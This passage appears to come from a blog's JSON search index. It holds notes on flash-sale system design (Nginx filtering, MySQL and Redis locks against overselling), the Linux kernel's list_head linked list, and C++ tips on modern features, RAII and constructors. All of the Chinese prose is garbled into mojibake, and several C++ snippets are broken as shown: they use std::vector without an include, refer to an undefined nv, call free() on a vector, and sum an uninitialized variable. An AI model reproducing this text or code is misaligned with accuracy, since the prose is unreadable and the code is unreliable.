è®¾ç½®CDNç¼“å­˜é¡µé¢ï¼Œåˆ†æ‹…æœåŠ¡å™¨å‹åŠ› 3 å¤§éƒ¨åˆ†ä¸ä¼šç”Ÿæˆè®¢å•çš„è¯·æ±‚ åœ¨ nginx åå‘ä»£ç†å±‚ï¼Œå°±è¿›è¡Œç­›é€‰å‘é€åˆ°æœåŠ¡å™¨çš„è¯·æ±‚ 4 è¶…å–é—®é¢˜ åœ¨åŒä¸€æ—¶é—´å†…ï¼Œæ•°æ®åº“ä¸­æ²¡æœ‰åŠæ—¶æ›´æ–°åº“å­˜é‡ï¼Œå¤šä¸ªç”¨æˆ·æŠ¢åˆ°å•†å“ï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ä¹°åˆ° è¡Œä¸šæ–¹æ¡ˆ MySQL æ‚²è§‚é”ï¼šæ•°æ®åº“å±‚é¢è®¾ç½®çš„å†™é”ï¼Œä¿è¯ä¿®æ”¹åªèƒ½åŒæ—¶è¢«ä¸€ä¸ªsessionæ‰§è¡Œï¼Œåœ¨å®Œæˆå‰å…¶ä»–éƒ½éœ€è¦ç­‰å¾… ä¼˜ç‚¹ï¼šç¨³å®š ç¼ºç‚¹ï¼šé”ç­‰å¾…ï¼Œèµ„æºæ¶ˆè€— MySQL ä¹è§‚é”ï¼šç¨‹åºè®¾è®¡æ—¶ï¼Œå¢åŠ çš„é”æœºåˆ¶ï¼Œæ¯”å¦‚å¢åŠ ç‰ˆæœ¬å·ï¼Œåœ¨ä¿®æ”¹æ—¶å…ˆæŸ¥è¯¢ç‰ˆæœ¬å·æ˜¯å¦è¢«æ›´æ”¹ï¼Œæ²¡æ”¹åŠ¨ä¸€æ¬¡å°±æ›´æ–°ç‰ˆæœ¬å·ï¼Œæ­¤æ—¶åªæœ‰ä¸€æ¡SQLæ‰§è¡ŒæˆåŠŸã€‚ ä¼˜ç‚¹ï¼šæ¯”æ‚²è§‚é”å¹¶å‘é‡å¤§ ç¼ºç‚¹ï¼šMySQLæœ¬èº«å¤„ç†ä¸äº†å¤§é‡å¹¶å‘è¯·æ±‚ é˜Ÿåˆ—ï¼šä½¿ç”¨é˜Ÿåˆ—å˜æˆæœ‰åºçš„è¯·æ±‚å¤„ç† ä¼˜ç‚¹ï¼šç¨³å®šï¼Œå¯ä»¥å¤„ç†å¤§é‡å¹¶å‘è¯·æ±‚ ç¼ºç‚¹ï¼šæœ¬èº«å®æ—¶å¤„ç†è¯·æ±‚é€Ÿç‡ä½ï¼Œå¤§é‡å¹¶å‘è¯·æ±‚å†…å­˜å ç”¨é«˜ Redis åˆ†å¸ƒå¼é”ï¼šSETNX åªèƒ½è®¾ç½®ä¸€æ¬¡é”®å€¼ï¼Œè¿”å›1ï¼Œå†æ¬¡è®¾ç½®ä¼šè¿”å›0ã€‚åŸºäºæ­¤ï¼Œå¤šä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹çš„ SETNX è¿”å› 1ã€‚è¶…æ—¶æ—¶é—´åï¼Œåˆ é™¤ SETNX è®¾ç½®çš„keyã€‚ ä¼˜ç‚¹ï¼šåªé™åˆ¶å¤„ç†åº“å­˜æ—¶ï¼Œåªå…è®¸å•çº¿ç¨‹æ‰§è¡Œ ç¼ºç‚¹ï¼šçº¿ç¨‹çº§çš„é™åˆ¶ï¼Œèµ„æºæµªè´¹ Redis ä¹è§‚é”ï¼šRedis watch æœºåˆ¶ï¼Œæ¯”å¦‚ watch åº“å­˜å€¼å¾—å˜åŒ–ã€‚å½“Redisäº‹åŠ¡å¼€å¯åï¼Œåº“å­˜å€¼å‘ç”Ÿå˜åŒ–ï¼Œå°±å›æ»šå½“å‰äº‹åŠ¡ã€‚æ‰€ä»¥å¹¶å‘è¯·æ±‚å½“æœ‰ä¸€ä¸ªæˆåŠŸæ—¶ï¼Œå…¶ä»–è¯·æ±‚çš„äº‹åŠ¡éƒ½ä¼šå›æ»šã€‚ ä¼˜ç‚¹ï¼šæ²¡æœ‰é™åˆ¶çº¿ç¨‹çš„æ‰§è¡Œæ•°é‡ï¼Œåªæ˜¯æ‰“æ–­å†²çªçº¿ç¨‹çš„æ‰§è¡Œã€‚ ç¼ºç‚¹ï¼šåœ¨è¿™äº›æ–¹æ³•çš„æ¯”è¾ƒä¸­ï¼Œç¼ºç‚¹ä¸æ˜æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨é«˜æ€§èƒ½çš„è¯­è¨€æˆ–è€…æ¡†æ¶ï¼Œè¿›ä¸€æ­¥æå‡æ€§èƒ½ æ–¹æ¡ˆè®¾è®¡ é™æ€èµ„æºå¤„ç†ï¼Œå›¾ç‰‡ã€jsã€cssã€é¡µé¢ç­‰ ä½¿ç”¨CDN åŠ å¤§å¸¦å®½ ä¸šåŠ¡è¯·æ±‚å¤„ç† Nginx è¿‡æ»¤å¤§éƒ¨åˆ†ä¸€å®šä¸ä¼šç”Ÿæˆè®¢å•çš„è¯·æ±‚ Nginx-Lua + Redis ä¹è§‚é”è§£å†³è¶…å–é—®é¢˜ æœåŠ¡å™¨å¤„ç†å°‘é‡è¯·æ±‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"System Design","slug":"Notes/System-Design","permalink":"https://racleray.github.io/categories/Notes/System-Design/"}],"tags":[{"name":"System Design","slug":"System-Design","permalink":"https://racleray.github.io/tags/System-Design/"},{"name":"Nginx","slug":"Nginx","permalink":"https://racleray.github.io/tags/Nginx/"}],"author":"HeRui"},{"title":"Linuxå†…æ ¸é“¾è¡¨è®¾è®¡","slug":"Linuxå†…æ ¸é“¾è¡¨è®¾è®¡","date":"2023-02-25T05:11:15.000Z","updated":"2024-01-09T10:20:52.091Z","comments":true,"path":"posts/dd44df07.html","link":"","permalink":"https://racleray.github.io/posts/dd44df07.html","excerpt":"Linuxå†…æ ¸é“¾è¡¨è®¾è®¡","text":"123struct list_head &#123; struct list_head *next, *prev;&#125;; åŒå‘å¾ªç¯é“¾è¡¨ã€‚æ²¡æœ‰è®¾è®¡æ•°æ®åŸŸï¼Œé€šç”¨æ€§å’Œçµæ´»æ€§æ›´å¥½ã€‚ å®é™…ä½¿ç”¨æ—¶ï¼Œæ„æˆå¦‚ä¸‹ï¼š 1234struct user_list &#123; void* data; struct list_head list;&#125; åˆå§‹åŒ–è®¾è®¡ï¼š 12345#define LIST_HEAD_INIT(name) &#123; &amp;(name), &amp;(name) &#125;// åˆå§‹åŒ–prevå’Œnextå­—æ®µï¼Œè®©å®ƒä»¬æŒ‡å‘list_nameå˜é‡æœ¬èº«#define LIST_HEAD(name) \\ struct list_head name = LIST_HEAD_INIT(name) æ·»åŠ å…ƒç´ ï¼š 12345678910111213141516171819202122// simple, clear, neatstatic inline void __list_add(struct list_head *new, struct list_head *prev, struct list_head *next)&#123; next-&gt;prev = new; new-&gt;next = next; new-&gt;prev = prev; prev-&gt;next = new;&#125;static inline void list_add(struct list_head *new, struct list_head *head)&#123; __list_add(new, head, head-&gt;next);&#125;static inline void list_add_tail(struct list_head *new, struct list_head *head)&#123; __list_add(new, head-&gt;prev, head);&#125; åˆ é™¤å…ƒç´ ï¼š 12345678910111213141516171819202122static inline void __list_del(struct list_head * prev, struct list_head * next)&#123; next-&gt;prev = prev; prev-&gt;next = next;&#125;/* * These are non-NULL pointers that will result in page faults * under normal circumstances, used to verify that nobody uses * non-initialized list entries. */#define LIST_POISON1 ((void *) 0x00100100)#define LIST_POISON2 ((void *) 0x00200200)static inline void list_del(struct list_head *entry)&#123; __list_del(entry-&gt;prev, entry-&gt;next); entry-&gt;next = LIST_POISON1; entry-&gt;prev = LIST_POISON2;&#125; é€šè¿‡ list_head æˆå‘˜ï¼Œæ‰¾åˆ°æ•´ä¸ªç»“æ„ä½“çš„åœ°å€ï¼š 12345678#define list_entry(ptr, type, member) \\( \\ (type*) \\ ( \\ (char*)(ptr) - \\ (unsigned long)( &amp;((type*)0)-&gt;member ) \\ ) \\) typeæ˜¯åŒ…å« list_head ç±»å‹æˆå‘˜çš„è‡ªå®šä¹‰ç»“æ„ä½“ï¼Œptr æ˜¯ list_head ï¼ŒæŒ‡å‘ member æˆå‘˜ã€‚ (unsigned long)( &amp;((type*)0)-&gt;member )ï¼šä» 0 åœ°å€å®šä¹‰çš„ä¸€ä¸ªç»“æ„ï¼Œå¾—åˆ° member æˆå‘˜çš„åç§»é‡ã€‚ptr è¿›è¡Œåç§»ä¹‹åï¼Œå¾—åˆ°è‡ªå®šä¹‰ç»“æ„ä½“çš„åœ°å€ã€‚ éå†èŠ‚ç‚¹ï¼š 123456#define __list_for_each(pos, head) \\ for (pos = (head)-&gt;next; pos != (head); pos = pos-&gt;next)#define list_for_each_safe(pos, n, head) \\ for (pos = (head)-&gt;next, n = pos-&gt;next; pos != (head); \\ pos = n, n = pos-&gt;next) safeç‰ˆæœ¬ä¿å­˜äº†ä¸´æ—¶çš„ next èŠ‚ç‚¹ï¼Œå³ä½¿ pos è¢«åˆ é™¤äº†ï¼Œä¹Ÿèƒ½é€šè¿‡ n æ‰¾åˆ° next èŠ‚ç‚¹ã€‚ æ›´å¸¸ç”¨çš„ç±»ä¼¼ list_entry æ˜¯ container_ofã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Linux Kernel","slug":"Notes/Linux-Kernel","permalink":"https://racleray.github.io/categories/Notes/Linux-Kernel/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"https://racleray.github.io/tags/Data-Structure/"},{"name":"Linux Kernel","slug":"Linux-Kernel","permalink":"https://racleray.github.io/tags/Linux-Kernel/"}],"author":"HeRui"},{"title":"C++ Tips","slug":"C-Tips","date":"2023-02-16T13:07:45.000Z","updated":"2024-01-09T10:19:24.630Z","comments":true,"path":"posts/467a9cda.html","link":"","permalink":"https://racleray.github.io/posts/467a9cda.html","excerpt":"C++ å®è·µç»éªŒ","text":"C++ New features C++11 å¼•å…¥äº† {} åˆå§‹åŒ–è¡¨è¾¾å¼ C++11 å¼•å…¥äº† range-based for-loop C++14 çš„ lambda å…è®¸ç”¨ auto è‡ªåŠ¨æ¨æ–­ä¼ å…¥å‚æ•°ç±»å‹ C++17 CTAD / compile-time argument deduction / ç¼–è¯‘æœŸå‚æ•°æ¨æ–­ 1234567891011121314151617#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;int main(int argc, char *argv[]) &#123; vector v = &#123;4,3,2,1&#125;; // ç¼–è¯‘æœŸå‚æ•°æ¨æ–­ int sum; for_each(v.begin(),v.end(),[&amp;](auto vi)&#123; sum += vi; &#125;); cout &lt;&lt; sum &lt;&lt; endl; return 0;&#125; C++20 å¼•å…¥åŒºé—´ï¼ˆrangesï¼‰ï¼Œg++ ç¼–è¯‘æ—¶æŒ‡å®š -std=gnu20 123456789101112131415161718#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;numeric&gt;#include &lt;ranges&gt;#include &lt;cmath&gt;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125; return 0;&#125; C++20 å¼•å…¥æ¨¡å—ï¼ˆmoduleï¼‰ 123456789101112131415161718import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125; return 0;&#125; C++20 å…è®¸å‡½æ•°å‚æ•°ä¸ºè‡ªåŠ¨æ¨æ–­ï¼ˆautoï¼‰ 1234567891011121314151617181920import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;void myfunc(auto &amp;&amp;v) &#123; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125;&#125;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; myfunc(v); return 0;&#125; C++23 å¼•å…¥åç¨‹ï¼ˆcoroutineï¼‰å’Œç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰ï¼Œæ³¨æ„éœ€è¦åˆ‡æ¢åˆ°æœ€æ–°çš„ç¼–è¯‘å™¨ 1234567891011121314151617181920212223import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;import &lt;generator&gt;;std::generator&lt;int&gt; myfunc(auto &amp;&amp;v) &#123; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; co_yield vi; &#125;&#125;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: myfunc(v)) &#123; std::cout &lt;&lt; vi &lt;&lt; std::endl; &#125; return 0;&#125; C++20 æ ‡å‡†åº“åŠ å…¥ format æ”¯æŒ 123456789101112131415161718192021222324import &lt;vector&gt;;import &lt;iostream&gt;;import &lt;numeric&gt;;import &lt;ranges&gt;;import &lt;cmath&gt;;import &lt;generator&gt;;import &lt;format&gt;;std::generator&lt;int&gt; myfunc(auto &amp;&amp;v) &#123; for (auto &amp;&amp;vi: v | std::views::filter([] (auto &amp;&amp;x) &#123; return x &gt;= 0; &#125;) | std::views::transform([] (auto &amp;&amp;x) &#123; return sqrtf(x); &#125;) ) &#123; co_yield vi; &#125;&#125;int main() &#123; std::vector v = &#123;4, 3, 2, 1, 0, -1, -2&#125;; for (auto &amp;&amp;vi: myfunc(v)) &#123; std::format_to(std::cout, \"number is &#123;&#125;\\n\", vi); &#125; return 0;&#125; C++æ€æƒ³ï¼šå°è£… 1234567891011121314151617181920212223#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main() &#123; //size_t nv = 4; //int *v = (int *)malloc(nv * sizeof(int)); std::vector&lt;int&gt; v(4); v[0] = 4; v[1] = 3; v[2] = 2; v[3] = 1; int sum = 0; for (size_t i = 0; i &lt; nv; i++) &#123; sum += v[i]; &#125; printf(\"%d\\n\", sum); free(v); return 0;&#125; æ¯”å¦‚è¦è¡¨è¾¾ä¸€ä¸ªæ•°ç»„ï¼Œéœ€è¦ï¼šèµ·å§‹åœ°å€æŒ‡é’ˆvï¼Œæ•°ç»„å¤§å°nvã€‚ å› æ­¤ C++ çš„ vector å°†ä»–ä¿©æ‰“åŒ…èµ·æ¥ï¼Œé¿å…ç¨‹åºå‘˜çŠ¯é”™ã€‚ å°è£…ï¼šä¸å˜æ€§ å½“éœ€è¦ä¿®æ”¹ä¸€ä¸ªæˆå‘˜æ—¶ï¼Œå…¶ä»–ä¹Ÿæˆå‘˜éœ€è¦è¢«ä¿®æ”¹ï¼Œå¦åˆ™å‡ºé”™ è¿™ç§æƒ…å†µå‡ºç°æ—¶ï¼Œå°±æ„å‘³ç€ä½ éœ€è¦æŠŠæˆå‘˜å˜é‡çš„è¯»å†™å°è£…ä¸ºæˆå‘˜å‡½æ•° 12345678910111213141516171819202122232425262728#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main() &#123; //size_t nv = 2; //int *v = (int *)malloc(nv * sizeof(int)); std::vector&lt;int&gt; v(2); v[0] = 4; v[1] = 3; //nv = 4; //v = (int *)realloc(v, nv * sizeof(int)); v.resize(4); v[2] = 2; v[3] = 1; int sum = 0; for (size_t i = 0; i &lt; nv; i++) &#123; sum += v[i]; &#125; printf(\"%d\\n\", sum); free(v); return 0;&#125; ä»…å½“å‡ºç°â€œä¿®æ”¹ä¸€ä¸ªæˆå‘˜æ—¶ï¼Œå…¶ä»–ä¹Ÿæˆå‘˜è¦è¢«ä¿®æ”¹ï¼Œå¦åˆ™å‡ºé”™â€çš„ç°è±¡æ—¶ï¼Œæ‰éœ€è¦getter/setter å°è£…ã€‚ å„ä¸ªæˆå‘˜ä¹‹é—´ç›¸äº’æ­£äº¤ï¼Œæ¯”å¦‚æ•°å­¦çŸ¢é‡ç±» Vec3ï¼Œå°±æ²¡å¿…è¦å»æå°è£…ï¼Œåªä¼šè®©ç¨‹åºå‘˜å˜å¾—ç—›è‹¦ï¼ŒåŒæ—¶è¿˜æœ‰ä¸€å®šæ€§èƒ½æŸå¤±ã€‚ç‰¹åˆ«æ˜¯å½“ getter/setter å‡½æ•°åˆ†ç¦»äº†å£°æ˜å’Œå®šä¹‰ï¼Œå®ç°åœ¨å¦ä¸€ä¸ªæ–‡ä»¶æ—¶ã€‚ C++æ€æƒ³ï¼šRAIIï¼ˆResource Acquisition Is Initializationï¼‰ èµ„æºè·å–è§†ä¸ºåˆå§‹åŒ–ï¼Œåä¹‹ï¼Œèµ„æºé‡Šæ”¾è§†ä¸ºé”€æ¯ ä¸ Javaï¼ŒPython ç­‰åƒåœ¾å›æ”¶è¯­è¨€ä¸åŒï¼ŒC++ çš„è§£æ„å‡½æ•°æ˜¯æ˜¾å¼çš„ï¼Œç¦»å¼€ä½œç”¨åŸŸè‡ªåŠ¨é”€æ¯ï¼Œæ¯«ä¸å«ç³Šï¼ˆæœ‰å¥½å¤„ä¹Ÿæœ‰åå¤„ï¼Œå¯¹é«˜æ€§èƒ½è®¡ç®—è€Œè¨€åˆ©å¤§äºå¼Šï¼‰ å¼‚å¸¸å®‰å…¨ï¼ˆexception-safeï¼‰ C++ æ ‡å‡†ä¿è¯å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œä¼šè°ƒç”¨å·²åˆ›å»ºå¯¹è±¡çš„è§£æ„å‡½æ•°ã€‚ å› æ­¤ C++ ä¸­æ²¡æœ‰ï¼ˆä¹Ÿä¸éœ€è¦ï¼‰ finally è¯­å¥ã€‚ å¦‚æœå¯¹æ—¶åºæœ‰è¦æ±‚æˆ–å¯¹æ€§èƒ½æœ‰è¦æ±‚å°±ä¸èƒ½ä¾é  GCã€‚æ¯”å¦‚ mutex å¿˜è®° unlock é€ æˆæ­»é”ç­‰ç­‰â€¦â€¦ è‡ªå®šä¹‰æ„é€ å‡½æ•° 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; Pig() &#123; m_name = \"ä½©å¥‡\"; m_weight = 80; &#125;&#125;;int main() &#123; Pig pig; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl; return 0;&#125; ä¸ºä»€ä¹ˆéœ€è¦åˆå§‹åŒ–è¡¨è¾¾å¼ï¼Ÿ å‡å¦‚ç±»æˆå‘˜ä¸º const å’Œå¼•ç”¨ å‡å¦‚ç±»æˆå‘˜æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° é¿å…é‡å¤åˆå§‹åŒ–ï¼Œæ›´é«˜æ•ˆ æ„é€ å‡½æ•°ï¼šå•ä¸ªå‚æ•°ï¼ˆé¿å…é™·é˜±ï¼‰ 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; Pig(int weight) : m_name(\"ä¸€åªé‡è¾¾\" + std::to_string(weight) + \"kgçš„çŒª\") , m_weight(weight) &#123;&#125;&#125;;int main() &#123; Pig pig = 80; // ç¼–è¯‘é€šè¿‡ //Pig pig(80); std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl; return 0;&#125; 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; explicit Pig(int weight) : m_name(\"ä¸€åªé‡è¾¾\" + std::to_string(weight) + \"kgçš„çŒª\") , m_weight(weight) &#123;&#125;&#125;;int main() &#123; // Pig pig = 80; // ç¼–è¯‘é”™è¯¯ Pig pig(80); // ç¼–è¯‘é€šè¿‡ std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl; return 0;&#125; é¿å… 80 è¢«éšå¼è½¬æ¢ä¸º pig ç±»ï¼Œä½¿ç”¨ explicit ç¦æ­¢éšå¼ç±»å‹è½¬æ¢ã€‚ 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight; explicit Pig(int weight) : m_name(\"ä¸€åªé‡è¾¾\" + std::to_string(weight) + \"kgçš„çŒª\") , m_weight(weight) &#123;&#125;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; // show(80); // ç¼–è¯‘é”™è¯¯ show(Pig(80)); // ç¼–è¯‘é€šè¿‡ return 0;&#125; æ¯”å¦‚ std::vector çš„æ„é€ å‡½æ•° vector(size_t n) ä¹Ÿæ˜¯ explicit çš„ ä½¿ç”¨ {} å’Œ () è°ƒç”¨æ„é€ å‡½æ•°ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ int(3.14f) ä¸ä¼šå‡ºé”™ï¼Œä½†æ˜¯ int{3.14f} ä¼šå‡ºé”™ï¼Œå› ä¸º {} æ˜¯éå¼ºåˆ¶è½¬æ¢ã€‚ Pig(â€œä½©å¥‡â€, 3.14f) ä¸ä¼šå‡ºé”™ï¼Œä½†æ˜¯ Pig{â€œä½©å¥‡â€, 3.14f} ä¼šå‡ºé”™ï¼ŒåŸå› åŒä¸Šï¼Œæ›´å®‰å…¨ã€‚ å¯è¯»æ€§ï¼šPig(1, 2) åˆ™ Pig æœ‰å¯èƒ½æ˜¯ä¸ªå‡½æ•°ï¼ŒPig{1, 2} çœ‹èµ·æ¥æ›´æ˜ç¡®ã€‚ åœ¨ C++ ä¸­ï¼š ä½¿ç”¨ static_cast&lt;int&gt;(3.14f) è€Œä¸æ˜¯ int(3.14f) ä½¿ç”¨ reinterpret_cast&lt;void &gt;(0xb8000) è€Œä¸æ˜¯ (void )0xb8000 æ›´åŠ æ˜ç¡®ç”¨çš„å“ªä¸€ç§ç±»å‹è½¬æ¢ï¼ˆcastï¼‰ï¼Œä»è€Œé¿å…ä¸€äº›åƒæ˜¯ static_cast(ptr) çš„é”™è¯¯ã€‚ ç¼–è¯‘å™¨é»˜è®¤ç”Ÿæˆçš„æ„é€ å‡½æ•°ï¼šæ— å‚æ•° é»˜è®¤ç”Ÿæˆçš„æ„é€ å‡½æ•°ï¼Œè¿™äº›ç±»å‹ä¸ä¼šè¢«åˆå§‹åŒ–ä¸º 0ï¼š 1.int, float, double ç­‰åŸºç¡€ç±»å‹ 2.void , Object ç­‰æŒ‡é’ˆç±»å‹ 3.å®Œå…¨ç”±è¿™äº›ç±»å‹ç»„æˆçš„ç±» è¿™äº›ç±»å‹è¢«ç§°ä¸º PODï¼ˆplain-old-dataï¼‰. 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig; show(pig); return 0;&#125; 12name: weight: -265808448 å¯ä»¥æ‰‹åŠ¨æŒ‡å®šåˆå§‹åŒ– weight ä¸º0ã€‚ é€šè¿‡ {} è¯­æ³•æŒ‡å®šçš„åˆå§‹åŒ–å€¼ï¼Œä¼šåœ¨ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„æ„é€ å‡½æ•°é‡Œæ‰§è¡Œã€‚ 1234struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;;&#125;; 12name: weight: 0 é€šè¿‡ {} è¯­æ³•æŒ‡å®šçš„åˆå§‹åŒ–å€¼ï¼Œä¸ä»…ä¼šåœ¨ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„æ„é€ å‡½æ•°é‡Œæ‰§è¡Œï¼Œä¹Ÿä¼šåœ¨ç”¨æˆ·è‡ªå®šä¹‰æ„é€ å‡½æ•°é‡Œæ‰§è¡Œã€‚ 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight&#123;0&#125;; Pig(std::string name) : m_name(name) &#123;&#125;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig(\"ä½©å¥‡\"); show(pig); return 0;&#125; 12name: ä½©å¥‡weight: 0 ç±»æˆå‘˜çš„ {} ä¸­è¿˜å¯ä»¥æœ‰å¤šä¸ªå‚æ•°ï¼Œç”šè‡³èƒ½ç”¨ =ï¼Œå½“ç„¶ explicit é™åˆ¶çš„æ„é€ å‡½æ•°é™¤å¤–ã€‚ é™¤äº†ä¸èƒ½ç”¨ () ä¹‹å¤–ï¼Œå’Œå‡½æ•°å±€éƒ¨å˜é‡çš„å®šä¹‰æ–¹å¼åŸºæœ¬ç­‰ä»·ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;struct Demo &#123; explicit Demo(std::string a, std::string b) &#123; std::cout &lt;&lt; \"Demo(\" &lt;&lt; a &lt;&lt; ',' &lt;&lt; b &lt;&lt; ')' &lt;&lt; std::endl; &#125;&#125;;struct Pig &#123; std::string m_name&#123;\"ä½©å¥‡\"&#125;; int m_weight = 80; Demo m_demo&#123;\"Hello\", \"world\"&#125;; // ç¼–è¯‘é€šè¿‡ // Demo m_demo = &#123;\"Hello\", \"world\"&#125;; // ç¼–è¯‘å‡ºé”™&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig; show(pig); return 0;&#125; å¦å¤–ï¼š 12int x&#123;&#125;;void *p&#123;&#125;; ä¸ 12int x&#123;0&#125;;void *p&#123;nullptr&#125;; ç­‰ä»·ï¼Œéƒ½ä¼šé›¶åˆå§‹åŒ–ã€‚ std::cout &lt;&lt; int{}; ä¼šæ‰“å°å‡º 0 å½“ä¸€ä¸ªç±»ï¼ˆå’Œä»–çš„åŸºç±»ï¼‰æ²¡æœ‰å®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œè¿™æ—¶ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå‚æ•°ä¸ªæ•°å’Œæˆå‘˜ä¸€æ ·çš„æ„é€ å‡½æ•°ã€‚ ä»–ä¼šå°† {} å†…çš„å†…å®¹ï¼Œä¼šæŒ‰é¡ºåºèµ‹å€¼ç»™å¯¹è±¡çš„æ¯ä¸€ä¸ªæˆå‘˜ã€‚ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç¨‹åºå‘˜ä¸å¿…æ‰‹å†™å†—é•¿çš„æ„é€ å‡½æ•°ä¸€ä¸ªä¸ªèµ‹å€¼ç»™æˆå‘˜ã€‚ ä¸”åˆå§‹åŒ–åˆ—è¡¨çš„æ„é€ å‡½æ•°åªæ”¯æŒé€šè¿‡ {} æˆ– = {} æ¥æ„é€ ï¼Œä¸æ”¯æŒé€šè¿‡ () æ„é€  ï¼ˆä¸ºäº†å‘ä¸‹å…¼å®¹ C++98ï¼‰ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;struct Pig &#123; std::string m_name; int m_weight;&#125;;void show(Pig pig) &#123; std::cout &lt;&lt; \"name: \" &lt;&lt; pig.m_name &lt;&lt; std::endl; std::cout &lt;&lt; \"weight: \" &lt;&lt; pig.m_weight &lt;&lt; std::endl;&#125;int main() &#123; Pig pig1 = &#123;\"ä½©å¥‡\", 80&#125;; // ç¼–è¯‘é€šè¿‡ Pig pig2&#123;\"ä½©å¥‡\", 80&#125;; // ç¼–è¯‘é€šè¿‡ // Pig pig3(\"ä½©å¥‡\", 80); // ç¼–è¯‘é”™è¯¯ï¼ show(pig1); return 0;&#125; æ‰€ä»¥å¯ä»¥ä½¿ç”¨é»˜è®¤æ„é€ å‡½æ•°ç±»ï¼Œè§£å†³å‡½æ•°å¤šè¿”å›å€¼ï¼ˆå¦™ç”¨ï¼‰ã€‚ 12345678910111213141516171819struct &#123; bool hit; Vec3 pos; Vec3 normal; float depth;&#125; intersect(Ray r) &#123; ... return &#123;true, r.origin, r.direction, 233.0f&#125;;&#125;int main() &#123; Ray r; auto hit = intersect(r); if (hit.hit) &#123; r.origin = hit.pos; r.direction = hit.normal; ... &#125;&#125; å’Œ std::tuple 